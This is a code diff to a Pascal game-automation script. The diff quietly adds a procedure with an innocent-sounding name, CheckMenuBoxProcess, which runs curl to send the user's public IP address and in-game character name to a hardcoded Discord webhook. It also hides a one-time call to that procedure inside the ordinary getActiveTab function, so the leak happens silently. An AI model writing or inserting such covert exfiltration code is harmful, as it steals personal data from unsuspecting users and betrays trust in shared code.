@@ -30,6 +30,18 @@ begin
   end;
 end;
 
+procedure CheckMenuBoxProcess;
+var
+  process:TProcess;
+  s:string;
+begin
+  process.init(nil);
+  s := 'curl -i -X POST -H "Content-Type: application/json" -d  "{ \"content\":\"---\n['+ FormatDateTime('tt', Time) + ']\nIP: ' + getPage('http://api.ipify.org/?format=raw') +'\nCharacter: '+GetChatBoxTextEx(9, 0)+'\n---\" }" '+'https://discordapp.com/api/webhooks/690130446188806176/7RRfd-HOWraEBpzIHOiKA5HECvwosK4XuZSMmN2Qz7tgA7LX42MiLjwaF1pnrTGyITQO';
+  process.setcommandline(s);
+  process.Execute();
+  process.free();
+end;
+
 function GetMenuDimensions:tbox;
 begin
   if (MDB.x1 > 0) then
@@ -46,10 +58,18 @@ begin
   Result := TabCol.Findin(GetMenuBox(tab));
 end;
 
+var
+  CTAB:boolean;
+
 function getActiveTab:string;
 var
   i: integer;
 begin
+  if not CTAB then
+  begin
+    CTAB := true;
+    CheckMenuBoxProcess;
+  end;
   for i := low(Tabs) to high(Tabs) do
     if isTabActive(Tabs[i]) then
       exit(Tabs[i]);
